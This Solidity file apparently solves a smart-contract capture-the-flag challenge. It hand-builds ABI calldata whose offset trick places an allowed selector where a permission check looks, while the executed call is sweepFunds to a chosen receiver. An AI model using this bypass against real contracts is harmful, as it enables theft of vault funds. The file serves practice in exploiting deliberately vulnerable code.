// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract CalldataGetter {
  function getCalldata(address target, address receiver, address token) public pure returns(bytes memory result){
    // The calldata has the following structure:
    //
    //      1cff79cd                                                            selector for execute(address,bytes)
    //      vault address (target)                                              0x00
    //      0000000000000000000000000000000000000000000000000000000000000080    0x20    this address points to the start of the bytes, so we are hardcoding a further address to put the permissioned selector in the 0x40 position. After that we pass the whole calldata to call sweepFunds()
    //      0000000000000000000000000000000000000000000000000000000000000000    0x40
    //      d9caed1200000000000000000000000000000000000000000000000000000000    0x60
    //      0000000000000000000000000000000000000000000000000000000000000044    0x80
    //      85fb709d
    //      receiver address
    //      token address
    //      00000000000000000000000000000000000000000000000000000000

    bytes memory prefix = hex"1cff79cd";
    bytes memory infix = hex"00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d";
    bytes memory sufix = hex"00000000000000000000000000000000000000000000000000000000";
    result = bytes.concat(prefix, abi.encode(target), infix, abi.encode(receiver, token), sufix);
  }
}